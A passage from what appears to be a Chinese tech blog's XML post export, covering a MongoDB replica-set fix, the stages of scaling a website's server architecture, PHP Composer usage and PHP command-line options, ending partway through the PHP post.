</blockquote>
<p><strong>发现如下问题</strong> <img src="http://qiniu.fengmumiao.com/mongo_2.png">好多报错，大概的意思是存储引擎冲突巴拉巴拉。。。 这是因为可能你的集群节点中有有数据的，并且  directoryperdb没有设置是默认值false，原来数据存储不是按文件夹存储的，如果一定要设为true的话 ， 找到你配置mongo的数据库存储目录 备份清空，就万事大吉了，坑了好久，网上都是水帖。 <strong>还有可能出现的问题</strong> Error: error: { “ok” : 0, “errmsg” : “not master and slaveOk=false”, “code” : 13435 } 原因：这是因为从节点无法读写 解决：执行命令: rs.slaveOk();   感谢大家，欢迎转载</p>
]]></content>
      <categories>
        <category>MongoDB</category>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>MongoDB</tag>
        <tag>大数据</tag>
      </tags>
  </entry>
  <entry>
    <title>循序渐进完善网站服务器架构</title>
    <url>/2017/01/21/%E5%BE%AA%E5%BA%8F%E6%B8%90%E8%BF%9B%E5%AE%8C%E5%96%84%E7%BD%91%E7%AB%99%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9E%B6%E6%9E%84/</url>
    <content><![CDATA[<h3 id="1-初始阶段的网站架构"><a href="#1-初始阶段的网站架构" class="headerlink" title="1. 初始阶段的网站架构"></a>1. 初始阶段的网站架构</h3><p>一般来讲，大型网站都是从小型网站发展而来，一开始的架构都比较简单，随着业务复杂和用户量的激增，才开始做很多架构上的改进。当它还是小型网站的时候，没有太多访客，一般来讲只需要一台服务器就够了，这时应用程序、数据库、文件等所有资源都在一台服务器上，网站架构如下图所示：</p>
<p>&amp;lt;img src=”<a href="https://pic2.zhimg.com/b1fb995ac418a4bb50bdb976d52a6c31/_b.png&quot;">https://pic2.zhimg.com/b1fb995ac418a4bb50bdb976d52a6c31\_b.png&quot;</a> data-rawwidth=”341” data-rawheight=”239” class=”content_image” width=”341”&amp;gt;</p>
<p><img src="http://7xnd02.com1.z0.glb.clouddn.com/big_web_1.png"></p>
<h2 id="2-应用服务和数据服务分离"><a href="#2-应用服务和数据服务分离" class="headerlink" title="2. 应用服务和数据服务分离"></a>2. 应用服务和数据服务分离</h2><p>随着网站业务的发展和用户量的增加，一台服务器就无法再满足需求了。大量用户访问导致访问速度越来越慢，而逐渐增加的数据也会导致存储空间不足。这时就需要将应用和数据分离，应用和数据分离后整个网站使用 3 台服务器：应用服务器、文件服务器和数据库服务器。这 3 台服务器对硬件资源的要求各不相同：</p>
<ul>
<li>应用服务器业务逻辑，需要强大的CPU</li>
<li>数据库服务器对磁盘读写操作很多，需要更快的磁盘和更大的内存</li>
<li>文件服务器存储用户上传的文件，因此需要更大的磁盘空间</li>
</ul>
<p>此时，网站系统的架构如下图所示：</p>
<p>&amp;lt;img src=”<a href="https://pic1.zhimg.com/f6d05e8fafd86940614503fdb53dd608/_b.png&quot;">https://pic1.zhimg.com/f6d05e8fafd86940614503fdb53dd608\_b.png&quot;</a> data-rawwidth=”445” data-rawheight=”317” class=”origin_image zh-lightbox-thumb” width=”445” data-original=”<a href="https://pic1.zhimg.com/f6d05e8fafd86940614503fdb53dd608_r.png&quot;&amp;gt">https://pic1.zhimg.com/f6d05e8fafd86940614503fdb53dd608_r.png&quot;&amp;gt</a>;</p>
<p><img src="http://7xnd02.com1.z0.glb.clouddn.com/big_web_2.png"></p>
<h2 id="3-使用缓存改善网站性能"><a href="#3-使用缓存改善网站性能" class="headerlink" title="3. 使用缓存改善网站性能"></a>3. 使用缓存改善网站性能</h2><p>随着用户再增加，网站又会一次面临挑战：数据库压力太大导致整站访问效率再此下降，用户体验受到影响。一个网站，往往 80% 的业务访问集中在 20% 的数据上，比如微博请求量最多的肯定是那些千万级粉丝的大 V 的微博，而几乎没有人关注的你的首页，除了自己想起来之外根本不会被打开。既然大部分业务访问集中在一小部分数据上，那就把这一小部分数据先提前缓存在内存中，而不是每次都去数据库读取，这样就可以减少数据库的访问压力，从而提高整个网站的访问速度。 网站使用的缓存一般分为缓存到应用服务器或者缓存在专门的分布式缓存服务器。缓存到应用服务器自己的访问速度快很多，但是受自身内存限制，往往不太适用。远程分布式缓存使用一个集群专门负责缓存服务，当内存不够还可以轻松得动态扩容。</p>
<p>&amp;lt;img src=”<a href="https://pic4.zhimg.com/3f7742ea34208549d12c8cbf9fa85bab/_b.png&quot;">https://pic4.zhimg.com/3f7742ea34208549d12c8cbf9fa85bab\_b.png&quot;</a> data-rawwidth=”517” data-rawheight=”491” class=”origin_image zh-lightbox-thumb” width=”517” data-original=”<a href="https://pic4.zhimg.com/3f7742ea34208549d12c8cbf9fa85bab_r.png&quot;&amp;gt">https://pic4.zhimg.com/3f7742ea34208549d12c8cbf9fa85bab_r.png&quot;&amp;gt</a>;</p>
<p><img src="http://7xnd02.com1.z0.glb.clouddn.com/big_web_3.png"></p>
<h2 id="4-使用应用服务器集群改善网站的并发处理能力"><a href="#4-使用应用服务器集群改善网站的并发处理能力" class="headerlink" title="4. 使用应用服务器集群改善网站的并发处理能力"></a>4. 使用应用服务器集群改善网站的并发处理能力</h2><p>使用缓存后，数据访问压力得到了缓解，但是单一应用服务器能够处理的请求连接有限，在网站访问高峰期，应用服务器就成了整个网站的效率瓶颈。使用分布式集群是网站解决高并发、海量数据问题的常用手段。当一台服务器的处理能力和存储空间不足时，不要尝试去更换更强大的服务器，对大型网站而言，多么强大的服务器，都满足不了网站持续增长的业务需求。这种情况下，更恰当的做法是增加一台服务器分担原有服务器的访问及存储压力。 对网站架构而言，只要能通过增加一台服务器的方式改善负载压力，就可以以同样的方式持续增加服务器不断改善系统性能，从而实现系统的可伸缩性。应用服务器实现集群是网站可伸缩架构设计中较为简单成熟的一种，如下图所示：</p>
<p>&amp;lt;img src=”<a href="https://pic3.zhimg.com/758b0d2283f0c8fe32059ef718aa9a1e/_b.png&quot;">https://pic3.zhimg.com/758b0d2283f0c8fe32059ef718aa9a1e\_b.png&quot;</a> data-rawwidth=”747” data-rawheight=”459” class=”origin_image zh-lightbox-thumb” width=”747” data-original=”<a href="https://pic3.zhimg.com/758b0d2283f0c8fe32059ef718aa9a1e_r.png&quot;&amp;gt">https://pic3.zhimg.com/758b0d2283f0c8fe32059ef718aa9a1e_r.png&quot;&amp;gt</a>;</p>
<p><img src="http://7xnd02.com1.z0.glb.clouddn.com/big_web_4.png"> 通过负载均衡调度服务器，可以将来自用户浏览器的访问请求分发到应用服务器集群中的任何一台服务器上，如果有更多用户，就在集群中加入更多的应用服务器，使应用服务器的压力不再成为整个网站的瓶颈。</p>
<h3 id="5-数据库读写分离"><a href="#5-数据库读写分离" class="headerlink" title="5. 数据库读写分离"></a>5. 数据库读写分离</h3><p>网站在使用缓存后，使对大部分数据读操作访问都可以不通过数据库就能完成，但是仍有一部分读操作（缓存访问不命中、缓存过期）和全部的写操作都需要访问数据库，在网站的用户达到一定规模后，数据库因为负载压力过高而成为网站的瓶颈。 目前大部分的主流数据库都提供主从热备功能，通过配置两台数据库主从关系，可以将一台数据库服务器的数据更新同步到另一台服务器上。网站利用数据库的这一功能，实现数据库读写分离，从而改善数据库负载压力。如下图所示： 应用服务器在写数据的时候，访问主数据库，主数据库通过主从复制机制将数据更新同步到从数据库，这样当应用服务器读数据的时候，就可以通过从数据库获得数据。为了便于应用程序访问读写分离后的数据库，通常在应用服务器端使用专门的数据访问模块，使数据库读写分离对应用透明。</p>
<p>&amp;lt;img src=”<a href="https://pic4.zhimg.com/3611799b5b84326062b86f7e8383b5e3/_b.png&quot;">https://pic4.zhimg.com/3611799b5b84326062b86f7e8383b5e3\_b.png&quot;</a> data-rawwidth=”747” data-rawheight=”569” class=”origin_image zh-lightbox-thumb” width=”747” data-original=”<a href="https://pic4.zhimg.com/3611799b5b84326062b86f7e8383b5e3_r.png&quot;&amp;gt">https://pic4.zhimg.com/3611799b5b84326062b86f7e8383b5e3_r.png&quot;&amp;gt</a>;</p>
<p><img src="http://7xnd02.com1.z0.glb.clouddn.com/big_web_5.png"></p>
<h3 id="6-使用反向代理和-CDN-加速网站响应"><a href="#6-使用反向代理和-CDN-加速网站响应" class="headerlink" title="6. 使用反向代理和 CDN 加速网站响应"></a>6. 使用反向代理和 CDN 加速网站响应</h3><p>随着网站业务不断发展，用户规模越来越大，由于中国复杂的网络环境，不同地区的用户访问网站时，速度差别也极大。有研究表明，网站访问延迟和用户流失率正相关，网站访问越慢，用户越容易失去耐心而离开。为了提供更好的用户体验，留住用户，网站需要加速网站访问速度。主要手段有使用 CDN 和反向代理。如下图所示：</p>
<p>&amp;lt;img src=”<a href="https://pic4.zhimg.com/cf613de59351dc6209fc23c722351adf/_b.png&quot;">https://pic4.zhimg.com/cf613de59351dc6209fc23c722351adf\_b.png&quot;</a> data-rawwidth=”811” data-rawheight=”572” class=”origin_image zh-lightbox-thumb” width=”811” data-original=”<a href="https://pic4.zhimg.com/cf613de59351dc6209fc23c722351adf_r.png&quot;&amp;gt">https://pic4.zhimg.com/cf613de59351dc6209fc23c722351adf_r.png&quot;&amp;gt</a>;</p>
<p><img src="http://7xnd02.com1.z0.glb.clouddn.com/big_web_6.png"></p>
<h3 id="7-使用分布式文件系统和分布式数据库系统"><a href="#7-使用分布式文件系统和分布式数据库系统" class="headerlink" title="7. 使用分布式文件系统和分布式数据库系统"></a>7. 使用分布式文件系统和分布式数据库系统</h3><p> 任何强大的单一服务器都满足不了大型网站持续增长的业务需求。数据库经过读写分离后，从一台服务器拆分成两台服务器，但是随着网站业务的发展依然不能满足需求，这时需要使用分布式数据库。文件系统也一样，需要使用分布式文件系统。如下图所示：</p>
<p>&amp;lt;img src=”<a href="https://pic2.zhimg.com/b41911410fd25fe17e53b8d99ee2808d/_b.png&quot;">https://pic2.zhimg.com/b41911410fd25fe17e53b8d99ee2808d\_b.png&quot;</a> data-rawwidth=”808” data-rawheight=”506” class=”origin_image zh-lightbox-thumb” width=”808” data-original=”<a href="https://pic2.zhimg.com/b41911410fd25fe17e53b8d99ee2808d_r.png&quot;&amp;gt">https://pic2.zhimg.com/b41911410fd25fe17e53b8d99ee2808d_r.png&quot;&amp;gt</a>;</p>
<p><img src="http://7xnd02.com1.z0.glb.clouddn.com/big_web_7.png"> 分布式数据库是网站数据库拆分的最后手段，只有在单表数据规模非常庞大的时候才使用。不到不得已时，网站更常用的数据库拆分手段是业务分库，将不同业务的数据部署在不同的物理服务器上。</p>
<h2 id="8-使用-NoSQL-和搜索引擎"><a href="#8-使用-NoSQL-和搜索引擎" class="headerlink" title="8. 使用 NoSQL 和搜索引擎"></a>8. 使用 NoSQL 和搜索引擎</h2><p>随着网站业务越来越复杂，对数据存储和检索的需求也越来越复杂，网站需要采用一些非关系数据库技术如 NoSQL 和非数据库查询技术如搜索引擎。如下图所示：</p>
<p>&amp;lt;img src=”<a href="https://pic3.zhimg.com/25f90e03351f541671aea86a488ae322/_b.png&quot;">https://pic3.zhimg.com/25f90e03351f541671aea86a488ae322\_b.png&quot;</a> data-rawwidth=”808” data-rawheight=”506” class=”origin_image zh-lightbox-thumb” width=”808” data-original=”<a href="https://pic3.zhimg.com/25f90e03351f541671aea86a488ae322_r.png&quot;&amp;gt">https://pic3.zhimg.com/25f90e03351f541671aea86a488ae322_r.png&quot;&amp;gt</a>;</p>
<p><img src="http://7xnd02.com1.z0.glb.clouddn.com/big_web_8.png"> NoSQL 和搜索引擎都是源自互联网的技术手段，对可伸缩的分布式特性具有更好的支持。应用服务器则通过一个统一数据访问模块访问各种数据，减轻应用程序管理诸多数据源的麻烦。</p>
<h3 id="9-业务拆分"><a href="#9-业务拆分" class="headerlink" title="9. 业务拆分"></a>9. 业务拆分</h3><p>大型网站为了应对日益复杂的业务场景，通过使用分而治之的手段将整个网站业务分成不同的产品线。如大型购物交易网站都会将首页、商铺、订单、买家、卖家等拆分成不同的产品线，分归不同的业务团队负责。 具体到技术上，也会根据产品线划分，将一个网站拆分成许多不同的应用，每个应用独立部署。应用之间可以通过一个超链接建立关系（在首页上的导航链接每个都指向不同的应用地址），也可以通过消息队列进行数据分发，当然最多的还是通过访问同一个数据存储系统来构成一个关联的完整系统，如下图所示：</p>
<p>&amp;lt;img src=”<a href="https://pic2.zhimg.com/cc6bd78d9d214d5e0fe6283b5ac2a3e5/_b.png&quot;">https://pic2.zhimg.com/cc6bd78d9d214d5e0fe6283b5ac2a3e5\_b.png&quot;</a> data-rawwidth=”831” data-rawheight=”506” class=”origin_image zh-lightbox-thumb” width=”831” data-original=”<a href="https://pic2.zhimg.com/cc6bd78d9d214d5e0fe6283b5ac2a3e5_r.png&quot;&amp;gt">https://pic2.zhimg.com/cc6bd78d9d214d5e0fe6283b5ac2a3e5_r.png&quot;&amp;gt</a>;</p>
<p><img src="http://7xnd02.com1.z0.glb.clouddn.com/big_web_9.png"></p>
<h3 id="10-分布式服务"><a href="#10-分布式服务" class="headerlink" title="10. 分布式服务"></a>10. 分布式服务</h3><p>随着业务拆分越来越小，存储系统越来越庞大，应用系统的整体复杂度呈指数级增加，部署维护越来越困难。由于所有应用要和所有数据库系统连接，在数万台服务器规模的网站中，这些连接的数目是服务器规模的平方，导致数据库连接资源不足，拒绝服务。 既然每一个应用系统都需要执行许多相同的业务操作，比如用户管理、商品管理等，那么可以将这些共用的业务提取出来，独立部署。由这些可复用的业务连接数据库，提供共用业务服务，而应用系统只需要管理用户界面，通过分布式服务调用共用业务服务完成具体业务操作。如下图所示：</p>
<p>&amp;lt;img src=”<a href="https://pic1.zhimg.com/694fb3f64b999a481b9b1166e6c09600/_b.png&quot;">https://pic1.zhimg.com/694fb3f64b999a481b9b1166e6c09600\_b.png&quot;</a> data-rawwidth=”974” data-rawheight=”506” class=”origin_image zh-lightbox-thumb” width=”974” data-original=”<a href="https://pic1.zhimg.com/694fb3f64b999a481b9b1166e6c09600_r.png&quot;&amp;gt">https://pic1.zhimg.com/694fb3f64b999a481b9b1166e6c09600_r.png&quot;&amp;gt</a>;</p>
<p><img src="http://7xnd02.com1.z0.glb.clouddn.com/big_web_10.png"> 大型网站的架构演化到这里，基本上大多数的技术问题都可以得以解决了。</p>
]]></content>
      <categories>
        <category>WEB技术</category>
        <category>服务器</category>
      </categories>
      <tags>
        <tag>服务器</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP神器之Composer</title>
    <url>/2016/12/27/php%E7%A5%9E%E5%99%A8%E4%B9%8Bcomposer/</url>
    <content><![CDATA[<p>Composer是一个非常流行的PHP包依赖管理工具,已经取代PEAR包管理器,对于PHP开发者来说掌握Composer是必须的. 对于使用者来说Composer非常的简单,通过简单的一条命令将需要的代码包下载到vendor目录下,然后开发者就可以引入包并使用了. 其中的关键在于你项目定义的composer.json,可以定义项目需要依赖的包(可能有多个),而依赖的包可能又依赖其他的包(这就是组件的好处),这些都不用你烦心,Composer会自动下载你需要的一切,一切在于composer.json的定义. Composer对于使用者来说是很透明,但是其背后的理念还是需要了解一下的,其的诞生也不是偶然的,得益于Github的快速发展,PHP语言也越来越现代化,显得更高大上了. 为了理解Composer,先大概了解下其结构:</p>
<p><strong>Composer的结构</strong></p>
<ul>
<li>Composer命令行工具:这个理解就比较简单了,通过使用者定义的Composer.json去下载你需要的代码,假如只是简单的使用Composer,那么掌握一些具体命令就完全可以了</li>
<li>Autoloading代码加载器:通过Composer,开发者可以通过多种方式去使用,而其中的关键在于PHP的命名空间概念,以及PSR-4标准的发展,Composer只是根据这二者开发了一个代码自动加载器</li>
<li>Github:有了Github,PHP开发人员可以将开源的代码托管在这上面,而Composer的发展源于Github,Composer本质上就是将Github上的代码下载到本地.</li>
<li>Packagist:对于使用者来说使用的是Composer的命令行工具,那么命令行工具怎么知道有多少包可以被用户使用呢,这主要就是依赖于Packagist,Packagist是Composer主要的一个包信息存储库,包开发者将具体代码托管到Github上,将包信息提交到Packagist上,这样使用者就可以通过Composer去使用.</li>
<li>Composer根据本地定义的composer.json信息去查询Packagist,Packagist根据Composer.json/Package.json信息解析,最终对应到github仓库,Composer最终下载代码的时候还要依赖于Github仓库上的Composer.json,这里涉及到三种类型的composer.json,含义是不一样的.</li>
<li>Composer.json:这是Composer的核心,是Composer的规则,上面也提到了三种类型的Composer.json,在使用的时候一定要注意区分,我初学的时候就总是搞乱.</li>
</ul>
<p><strong>Composer命令行工具</strong></p>
<p><strong>composer init</strong> 使用者可以在自己的项目下创建composer.json以便定义你项目的依赖包,也可以通过composer init交互式的创建composer.json.<br> <strong>composer install</strong> 应该是最常用的命令,composer会根据本地的composer.json安装包,将下载的包放入项目下的vendor目录下,同时将安装时候的包版本信息放入到composer.lock,以便锁定版本. 其实在install的时候,假如发现composer.lock版本和目前vendor目录下的代码版本是一致的,则Composer会什么也不做,composer.lock的目的就是让你安心在目前这个版本下工作,而不获取最新版本的包.</p>
<p><strong>composer update</strong> 那么如何更新composer.lock以便获取到最新版本的包呢?通过这个命令即可更新最新版本的包 <strong>composer config</strong> 这个命令还是建议了解下,全局的配置保存在COMPOSER_HOME/config.json,非全局的配置信息则存储在本项目目录下.</p>
<blockquote>
<p>composer config –list -g composer config -g notify-on-install false composer global config bin-dir –absolute</p>
</blockquote>
<p><strong>composer create-project</strong> 这个命令不常用,但是个人觉得还是很重要的,使用普通的install命令是将项目所有的依赖包下载到本项目vendor目录下.而通过这个命令则是将所有的代码及其依赖的包放到一个目录下,相当于执行了一个git clone命令,一般是包的开发者可能为了修复bug会使用该命令.</p>
<p><strong>composer global</strong> 这是一个全局的安装命令,它允许你在COMPOSER_HOME目录下执行Composer的命令,比如install,update.当然你的COMPOSER_HOME要在$PATH环境下. 比如执行composer global require fabpot/php-cs-fixer,现在php-cs-fixer命令行可以全局运行了,如果稍后想更新它,只需要运行composer global update</p>
<p><strong>composer dump-autoload</strong> 当你修改项目下的composer.json的文件,并不一定要运行composer update命令进行更新,有的时候可以使用该命令来更新加载器,比如你要引用本地自定义的包(不是来自于packagist),后面会通过实践来说明该命令.</p>
<p><strong>composer require</strong> 假如手动或者交互式创建composer.json文件,可以直接使用该命令来安装包</p>
<blockquote>
<p>composer require  cerdic/css-tidy:1.5.2 composer require “ywdblog/phpcomposer:dev-master”</p>
</blockquote>
<p><strong>–prefer-source和–prefer-dist参数</strong> –prefer-dist:对于稳定的包来说,一般Composer安装默认使用该参数,这也能加快安装,比如有可能直接从packagist安装了相应的包,而不用实际去Github上下载包. –prefer-source:假如使用该参数,则会直接从Github上安装,安装包后vendor目录下还含有.git信息</p>
<blockquote>
<p>composer require “ywdblog/phpcomposer:dev-master” –prefer-source #在vendor/ywdblog/phpcomposer目录下含有.git信息</p>
</blockquote>
<p><strong>如何给Composer添加代理</strong> 在国内使用Composer下载特别慢,可以通过二个方法进行加速</p>
<ul>
<li>composer config repo.packagist composer “<a href="https://packagist.phpcomposer.com“/">https://packagist.phpcomposer.com“</a></li>
<li>编辑composer.json</li>
</ul>
<blockquote>
<p>“repositories”: { “packagist”: { “type”: “composer”, “url”: “<a href="https://packagist.phpcomposer.com&quot;/">https://packagist.phpcomposer.com&quot;</a> } }</p>
</blockquote>
<p><strong>Autoloading代码加载器</strong> composer本身集成一个autoloader,支持PSR-4,PSR-0,classmap,files autoloading. 这里通过一个例子来说明通过Composer如何引用classmap,files,本地符合PSR-4标准的代码 编辑composer.json</p>
<blockquote>
<p>“autoload”: { “classmap”: [“othsrc/“,”classsrc.php”], “files”: [“othsrc/filesrc.php”], “psr-4”: {“Foo\Bar\“: “src”} }</p>
</blockquote>
<p>composer dump-autoload 通过上述的操作,对于PSR-4来说等同注册了一个PSR-4 autoloader(从FooBar命名空间) 假如不想使用Composer的autoloader,可以直接包含vendor/composer/autoload_*.php 文件,配置自己的加载器. 具体的例子托管在github上,可参考. <strong>Repositories</strong> 关于Repositories,了解其不是必须的,但是假如掌握则更能理解Composer,对于Repositories,其中文文档和英文文档解释的很好,这里也进行了一些摘抄. <strong>基本概念</strong> 包: Composer是一个依赖管理工具,它在本地安装一些资源包和包的描述(比如包名称和对应的版本),比较重要的元数据描述是dist和source,dist指向一个存档,该存档是对一个资源包的某个版本的数据进行的打包.source指向一个开发中的源,这通常是一个源代码仓库(比如git) 资源库: 一个资源库是一个包的来源.它是一个packages/versions的列表. Composer将查看所有你定义的repositories以找到项目需要的资源包(这句话很重要). 默认情况下已经将Packagist.org注册到Composer(或者理解为Packagist.org是Composer资源库默认的仓库类型) <strong>Composer资源库类型</strong> Composer资源库包括四种类型,默认的是composer类型,也就是packagist.org所使用的资源类型. 它使用一个单一的packages.json文件,包含了所有的资源包元数据.当你将包发布到pckagist.org上,则默认系统会创建一个packages.json,不过我没有找到我的包对应的文件. <strong>VCS资源库类型</strong> 假如你想构建一个私有的Composer私有资源库类型,可以使用该类型,这里举一个例子,比如你在自己项目的composer.json定义如下,则就可以使用对应的Github上的代码了.</p>
<blockquote>
<p>{ “repositories”: [ { “type”: “vcs”, “url”: “<a href="https://github.com/ywdblog/phpcomposer&quot;">https://github.com/ywdblog/phpcomposer&quot;</a> } ], “require”: { “ywdblog/phpcomposer”: “dev-master” } }</p>
</blockquote>
<p>当运行composer update的时候,Comoser实际上是从Github上下载包而不是从pckagist.org上下载. 另外假如需要使用Package资源库类型或者PEAR资源库类型,参考官方文档即可,一般在composer.json中定义name、version属性即可. <strong>Composer.json</strong> 在本文上面也多次提到了composer.json,比如你希望使用第三方包则需要在本地定义composer.json,Composer安装第三方包后,也会在第三方包目录下发现composer.json,那么这二者都叫composer.json,有什么区别呢?理解这非常的重要. 假如你在自己的项目下面定义一个composer.json,则这个包称之为ROOT包,这个composer.json定义你项目需要的条件(比如你的项目可能依赖一个第三方包). composer.json中有些属性只能被ROOT包使用,比如config属性只在ROOT包中生效. 一个资源包是不是ROOT包,取决于它的上下文,比如你git clone ywdblog/phpcomposer,则这时候本地phpcomposer目录就是ROOT包,假如你在本地phpcomposer目录下composer require ywdblog/phpcomposer,则这时候你的项目phpcomposer就是ROOT包. 了解composer-schema.json可参考该网址,Laravel作为一个成熟的框架,其定义的composer.json非常经典 <strong>关于包的版本</strong> 当使用者在本地配置composer.json的时候,可以指定需要包的特定版本,Composer支持从Github仓库中下载Tag或者分支下的包. 对于Github上的Tag来说,Packagist会创建对应包的版本,它符合X.Y.Z,vX.Y.Z,X.Y.Z-包类型,就是说Github上虽然只有一个特定版本的包,但Composer支持多种形式的引用方式,比如:</p>
<blockquote>
<p>composer require monolog/monolog1.0.0-RC1 composer require monolog/monolog  v1.0.0-RC1 composer require monolog/monolog1.0.* composer require monolog/monolog  ~1.10</p>
</blockquote>
<p>对于Github上的分支来说,Packagist会创建对应包的版本,假如分支名看起来像一个版本,将创建{分支名}-dev的包版本号,如果分支名看起来不像一个版本号,它将会创建dev-{分支名}形式的版本号</p>
<blockquote>
<p>composer require monolog/monolog  master-dev composer require monolog/monolog  master.x-dev</p>
</blockquote>
<p><strong>总结:</strong> 理解Composer,最重要的是实践,最后也能明白PSR-4和命名空间,也可以尝试将你的项目发布到pckagist.org上.</p>
]]></content>
      <categories>
        <category>编程</category>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP 命令行下的世界</title>
    <url>/2016/12/27/php-%E5%91%BD%E4%BB%A4%E8%A1%8C%E4%B8%8B%E7%9A%84%E4%B8%96%E7%95%8C/</url>
    <content><![CDATA[<p>PHP作为一门web开发语言，通常情况下我们都是在Web Server中运行PHP，使用浏览器访问，因此很少关注其命令行操作以及相关参数的使用，但是，特别是在类Unix操作系统上，PHP可以作为一门脚本语言执行与shell类似的处理任务。</p>
<h2 id="php命令行-CLI-参数详解"><a href="#php命令行-CLI-参数详解" class="headerlink" title="php命令行(CLI)参数详解"></a>php命令行(CLI)参数详解</h2><p>查看PHP的所有命令行参数，使用php -h命令。我们将会对大部分常用的命令行参数进行一一解释，以加深对PHP能力的认识，更加快捷的在服务端命令行下使用PHP或者调试各种因为对环境不熟悉而出现的问题。</p>
<blockquote>
<p>-a 以交互式shell模式运行 -c | 指定php.ini文件所在的目录 -n 指定不使用php.ini文件 -d foo[=bar] 定义一个INI实体，key为foo，value为’bar’ -e 为调试和分析生成扩展信息 -f 解释和执行文件. -h 打印帮助 -i 显示PHP的基本信息 -l 进行语法检查 (lint) -m 显示编译到内核的模块 -r 运行PHP代码，不需要使用标签 ..?&gt; -B 在处理输入之前先执行PHP代码 -R 对输入的没一行作为PHP代码运行 -F Parse and execute  for every input line -E Run PHP  after processing all input lines -H Hide any passed arguments from external tools. -S : 运行内建的web服务器. -t指定用于内建web服务器的文档根目录 -s 输出HTML语法高亮的源码 -v 输出PHP的版本号 -w 输出去掉注释和空格的源码 -z 载入Zend扩展文件 .   args…传递给要运行的脚本的参数. 当第一个参数以-开始或者是脚本是从标准输入读取的时候，使用–参数   –ini显示PHP的配置文件名   –rf 显示关于函数的信息. –rc 显示关于类的信息. –re 显示关于扩展的信息. –rz 显示关于Zend扩展的信息. –ri 显示扩展的配置信息.</p>
</blockquote>
<p>上面列出了PHP命令所有的参数及其注释，接下来，我们将对其中比较常用的参数举例说明。</p>
<h3 id="以交互式shell模式运行php"><a href="#以交互式shell模式运行php" class="headerlink" title="以交互式shell模式运行php"></a>以交互式shell模式运行php</h3><p>用过 Python 的朋友对Python的交互式shell比较熟悉，在命令行下，如果我们直接输入python命令，则会进入python的交互式shell程序，接下来就可以交互式的执行一些计算任务。 在PHP命令行中，同样提供了类似的功能，使用-a参数即可进入交互shell模式。 在该shell中，我们可以执行一些简单的任务，而不需要总是新建一个php文件。 更详细的使用说明，请参考官方文档</p>
<h3 id="运行内建的Web服务器"><a href="#运行内建的Web服务器" class="headerlink" title="运行内建的Web服务器"></a>运行内建的Web服务器</h3><p>从PHP 5.4.0开始，PHP的命令行模式提供了一个内建的web服务器。使用-S开始运行web服务。 假设当前我们处在目录/Users/mylxsw/codes/php/aicode/demo，在该目录中，存在index.php文件。</p>
<blockquote>
<p>$ ls index.php $ cat index.php &lt;?php echo “Hello, PHPER!”;</p>
</blockquote>
<p>在该目录中，执行以下命令可以启动内建web服务器，并且默认以当前目录为工作目录</p>
<blockquote>
<p>$ php -S localhost:8000 PHP 5.6.3 Development Server started at Wed Jun 10 15:49:41 2015 Listening on <a href="http://localhost:8000/">http://localhost:8000</a> Document root is /Users/mylxsw/codes/php/aicode/demo Press Ctrl-C to quit.</p>
</blockquote>
<p>我们另外开启一个shell窗口，请求<a href="http://localhost:8000/%E5%8D%B3%E5%8F%AF%E7%9C%8B%E5%88%B0%E8%84%9A%E6%9C%AC%E8%BE%93%E5%87%BA">http://localhost:8000/即可看到脚本输出</a></p>
<blockquote>
<p>$ curl -is <a href="http://localhost:8000/">http://localhost:8000/</a> HTTP/1.1 200 OK Host: localhost:8000 Connection: close X-Powered-By: PHP/5.6.3 Content-type: text/html;   Hello, PHPER!</p>
</blockquote>
<p>在web服务运行的窗口，可以看到输出的日志信息 以上我们在启动内建服务器的时候，只指定了-S参数让PHP以web服务器的方式运行，这时，PHP会使用当前目录作为工作目录，因此回到当前目录下寻找请求的文件，我们还可以使用-t参数指定其它的目录作为工作目录（文档根目录）。 更多详细信息，请参考官方文档。</p>
<h3 id="查找PHP的配置文件"><a href="#查找PHP的配置文件" class="headerlink" title="查找PHP的配置文件"></a>查找PHP的配置文件</h3><p>在有的时候，由于服务器上软件安装比较混乱，我们可能安装了多个版本的PHP环境，这时候，如何定位我们的PHP程序使用的是那个配置文件就比较重要了。在PHP命令行参数中，提供了–ini参数，使用该参数，可以列出当前PHP的配置文件信息。</p>
<blockquote>
<p>$ php –ini Configuration File (php.ini) Path: /usr/local/etc/php/5.6 Loaded Configuration File:         /usr/local/etc/php/5.6/php.ini Scan for additional .ini files in: /usr/local/etc/php/5.6/conf.d Additional .ini files parsed:      (none)   $ /usr/local/php/bin/php –ini Configuration File (php.ini) Path: /usr/local/php/etc/ Loaded Configuration File:         /usr/local/php/etc/php.ini Scan for additional .ini files in: (none) Additional .ini files parsed:      (none)</p>
</blockquote>
<p>上述的服务器上我们安装了两个版本的PHP，由上可以看到，使用php –ini命令可以很方便的定位当前PHP命令将会采用哪个配置文件。</p>
<h3 id="查看类-函数-扩展信息"><a href="#查看类-函数-扩展信息" class="headerlink" title="查看类/函数/扩展信息"></a>查看类/函数/扩展信息</h3><p>通常，我们可以使用php –info命令或者在在web服务器上的php程序中使用函数phpinfo()显示php的信息，然后再查找相关类、扩展或者函数的信息，这样做实在是麻烦了一些。</p>
<blockquote>
<p>$ php –info | grep redis redis Registered save handlers =&gt; files user redis This program is free software; you can redistribute it and/or modify</p>
</blockquote>
<p>我们可以使用下列参数更加方便的查看这些信息</p>
<blockquote>
<p>–rf 显示关于函数的信息. –rc 显示关于类的信息. –re 显示关于扩展的信息. –rz 显示关于Zend扩展的信息. –ri 显示扩展的配置信息.</p>
</blockquote>
<p>例如，我们希望查看扩展redis的配置信息</p>
<blockquote>
<p>$ php –ri redis   redis   Redis Support =&gt; enabled Redis Version =&gt; 2.2.7</p>
</blockquote>
<p>查看redis类的信息</p>
<blockquote>
<p>$ php –rc redis Class [class Redis ] {   - Constants [19] { Constant [ integer REDIS_NOT_FOUND ] { 0 } … - Methods [201] { … Method [public method echo ] { } …</p>
</blockquote>
<p>查看函数printf的信息</p>
<blockquote>
<p>$ php –rf printf Function [function printf ] {   - Parameters [2] { Parameter #0 [  $format ] Parameter #1 [  …$args ] } }</p>
</blockquote>
<h3 id="语法检查"><a href="#语法检查" class="headerlink" title="语法检查"></a>语法检查</h3><p>有时候，我们只需要检查php脚本是否存在语法错误，而不需要执行它，比如在一些编辑器或者IDE中检查PHP文件是否存在语法错误。 使用-l（–syntax-check）可以只对PHP文件进行语法检查。</p>
<blockquote>
<p>$ php -l index.php No syntax errors detected in index.php</p>
</blockquote>
<p>假如此时我们的index.php中存在语法错误</p>
<blockquote>
